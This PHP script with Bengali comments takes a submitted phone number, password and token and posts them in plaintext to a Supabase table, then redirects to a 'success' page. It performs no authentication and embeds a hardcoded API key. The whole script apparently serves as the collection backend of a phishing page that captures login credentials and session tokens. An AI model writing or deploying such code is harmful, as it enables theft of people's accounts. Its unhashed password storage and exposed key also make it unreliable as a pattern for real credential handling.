<?php
// ১. Supabase এর তথ্য সেট করা
$url = "https://hglekeepnigvpvsvazdb.supabase.co/rest/v1/user_data";
$apiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhnbGVrZWVwbmlndnB2c3ZhemRiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMDc2NDEsImV4cCI6MjA4ODU4MzY0MX0.8PZYtqGgWUkhjJtP3Gp9OzcforLyM7L2U5bgDkrWwxA";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ২. ফর্ম থেকে ডাটা সংগ্রহ করা
    $phone    = isset($_POST['phone']) ? $_POST['phone'] : "";
    $password = isset($_POST['password']) ? $_POST['password'] : "";
    $token    = isset($_POST['token']) ? $_POST['token'] : "";

    // ৩. ডাটাবেসে পাঠানোর জন্য ডাটা ফরম্যাট করা
    $data = [
        "phone"    => $phone,
        "password" => $password,
        "token"    => $token
    ];

    // ৪. cURL ব্যবহার করে Supabase API-তে ডাটা পাঠানো
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . $apiKey,
        'Authorization: Bearer ' . $apiKey,
        'Content-Type: application/json',
        'Prefer: return=representation'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);

    // ৫. কাজ শেষ হলে রিডাইরেক্ট করা
    header("Location: index.html?status=success");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
